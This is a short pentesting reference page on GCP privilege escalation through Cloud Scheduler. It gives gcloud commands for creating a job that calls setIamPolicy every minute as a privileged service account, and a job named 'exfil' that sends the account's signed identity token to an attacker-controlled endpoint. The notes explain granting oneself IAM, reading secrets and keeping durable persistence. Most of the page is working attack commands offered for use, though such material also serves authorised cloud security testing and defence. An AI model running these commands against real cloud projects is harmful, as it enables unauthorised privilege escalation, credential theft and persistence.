---
title: "Cloud Scheduler: actAs a service account from a scheduled job"
description: "Creating a Cloud Scheduler job that calls an endpoint or Google API as a chosen service account via actAs."
keywords:
  - Cloud Scheduler
  - scheduled job
  - actAs
  - service account
  - OIDC token
---

# Cloud Scheduler

A Cloud Scheduler HTTP job can attach a service account and present its **OIDC or OAuth token** to the target it calls. With `cloudscheduler.jobs.create` plus `iam.serviceAccounts.actAs` on a privileged account, you point a job at a Google API (or your own endpoint) and it authenticates as that account, which both escalates and persists on a schedule.

## Create a job that acts as a service account

```bash
# OAuth token (googleapis.com targets): call an API as the SA
gcloud scheduler jobs create http privesc \
  --schedule "* * * * *" --uri "https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:setIamPolicy" \
  --http-method POST --message-body '{...}' \
  --oauth-service-account-email <privileged-sa>@<proj>.iam.gserviceaccount.com

# OIDC token (your endpoint): capture the signed identity token of the SA
gcloud scheduler jobs create http exfil \
  --schedule "* * * * *" --uri "https://you.example/collect" \
  --oidc-service-account-email <privileged-sa>@<proj>.iam.gserviceaccount.com
```

## Exploitation notes

- The OAuth variant calls Google APIs directly as the SA, so a job can grant you IAM or read secrets without you ever holding the token.
- The OIDC variant leaks the SA's signed identity token to an endpoint you control each run.
- A recurring schedule makes the job durable persistence until someone deletes it.

## Tools

- **gcloud** (`scheduler jobs create http`).

## References

- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud: GCP privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google: Cloud Scheduler authentication](https://cloud.google.com/scheduler/docs/http-target-auth)
